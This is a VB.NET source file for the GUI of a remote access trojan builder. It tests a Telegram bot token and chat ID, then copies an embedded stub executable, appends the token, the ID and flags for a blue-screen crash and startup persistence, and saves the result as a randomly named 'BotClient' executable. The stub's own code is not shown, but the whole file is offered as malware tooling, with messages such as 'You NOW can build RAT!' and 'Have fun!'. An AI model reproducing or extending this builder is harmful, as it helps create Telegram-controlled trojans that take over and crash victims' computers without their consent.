Public Class Mainer

    '-------------------------------------------------------------------------------------------------------------------------'
    '888    888                                                                          8888888b.  d8b                   888 '      
    '888    888                                                                          888   Y88b Y8P                   888 '      
    '888    888                                                                          888    888                       888 '      
    '8888888888 888  888  888  .d88b.  888d888  8888b.  88888b.   .d88b.   .d88b.        888   d88P 888 888  888  8888b.  888 '      
    '888    888 888  888  888 d88""88b 888P"       "88b 888 "88b d88P"88b d8P  Y8b       8888888P"  888 888  888     "88b 888 '      
    '888    888 888  888  888 888  888 888     .d888888 888  888 888  888 88888888       888 T88b   888 Y88  88P .d888888 888 '      
    '888    888 Y88b 888 d88P Y88..88P 888     888  888 888  888 Y88b 888 Y8b.           888  T88b  888  Y8bd8P  888  888 888 '      
    '888    888  "Y8888888P"   "Y88P"  888     "Y888888 888  888  "Y88888  "Y8888        888   T88b 888   Y88P   "Y888888 888 '      
    '                                                                 888                                                     '      
    '                                                             Y8b d88P                                                    '
    '                                                              "Y88P"                                                     '
    '-------------------------------------------------------------------------------------------------------------------------'

    Dim tested As Boolean = False
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        If TextBox1.Text = "-" Or TextBox2.Text = "-" Then MsgBox("Set your Data FIRST!!") : Exit Sub
        Try : Net.ServicePointManager.SecurityProtocol = Net.SecurityProtocolType.Tls12
            Dim BotClient = New Telegram.Bot.TelegramBotClient(TextBox1.Text) : BotClient.StartReceiving()
            If BotClient.IsReceiving Then : Try : Dim crs = BotClient.GetMeAsync().Result
                    MsgBox("API Connection Working!!! You NOW can build RAT!") : tested = True
                Catch ex As Exception : GoTo ffgfg : End Try : Else
ffgfg:
                MsgBox("API Connection NOT Working!!!") : End If : Catch ex As Exception : MsgBox(ex.Message) : End Try
    End Sub
    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        If Me.Size = Me.MinimumSize Then Button2.Text = "Build R.A.T. <<" : Me.Size = Me.MaximumSize Else Button2.Text = "Build R.A.T. >>" : Me.Size = Me.MinimumSize
    End Sub

    Private Sub Label3_Click(sender As Object, e As EventArgs) Handles Label3.Click
        MsgBox("First create your Bot after go on BotFatherBot '@BotFather' ..." & vbCrLf &
               "Generate and set here your BotFather API Token!!")
    End Sub
    Private Sub Label4_Click(sender As Object, e As EventArgs) Handles Label4.Click
        MsgBox("Set your Telegram ID.. " & vbCrLf &
            "Use '@chatIDrobot,@RawDataBot,ecc..' Generator for finding your Telegram ID..")
    End Sub
    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        TextBox1.Text = Clipboard.GetText()
    End Sub
    Private Sub Button4_Click(sender As Object, e As EventArgs) Handles Button4.Click
        TextBox2.Text = Clipboard.GetText()
    End Sub
    Private Sub Mainer_Load(sender As Object, e As EventArgs) ' Handles MyBase.Load
        MsgBox("Developed for fun. Use with responsability..Enjoy!! =)", MsgBoxStyle.Information)
    End Sub

    Private Sub Button5_Click(sender As Object, e As EventArgs) Handles Button5.Click

        BuilWindowsPayload(TextBox1.Text, TextBox2.Text, False, False)
    End Sub
    Private Sub BuilWindowsPayload(TokenBot As String, IdSender As String, BSOD As Boolean, Startup As Boolean)
        If tested <> True Then MsgBox("First Test Connection!!") : Exit Sub
        Randomize() : Dim rnd As New Random : sfd.FileName = "BotClient_" & rnd.Next(999) & ".exe"
        If sfd.ShowDialog <> DialogResult.Cancel Then
            Dim theStub As String = CurDir() & "\stub.exe"
            If IO.File.Exists(theStub) = False Then IO.File.WriteAllBytes(theStub, My.Resources.StuBot)
            IO.File.Copy(theStub, sfd.FileName, True)
            IO.File.AppendAllText(sfd.FileName, "§" & TokenBot & "§" & IdSender & "§" & BSOD & "§" & Startup & "§")
            Do While IO.File.Exists(theStub) : Application.DoEvents() : IO.File.Delete(theStub) : Loop
            MsgBox("Created! Have fun! - 'Payload: Windows Exe'")
        End If
    End Sub

End Class
